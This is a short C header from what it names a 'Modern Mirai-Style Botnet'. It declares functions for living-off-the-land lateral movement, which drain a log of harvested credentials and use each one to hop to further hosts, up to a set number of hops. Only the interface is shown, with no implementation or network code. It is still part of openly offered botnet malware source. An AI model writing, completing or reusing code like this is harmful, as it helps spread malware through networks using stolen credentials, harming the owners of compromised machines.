/*
 * notnet - Modern Mirai-Style Botnet
 * lotl.h - Living-off-the-land lateral movement (#144)
 */
#ifndef NOTNET_LOTL_H
#define NOTNET_LOTL_H

#include "protocol.h"

/* Run one LOTL cycle: drain the cred-log, spend each entry once.
 * Returns the number of credentials successfully spent, -1 on error. */
int lotl_run_cycle(notnet_bot_t *bot);

/* Low-level spend. Drains the cred-log, spends up to max_hops entries. */
int lotl_spend_creds(notnet_bot_t *bot, int max_hops);

#endif
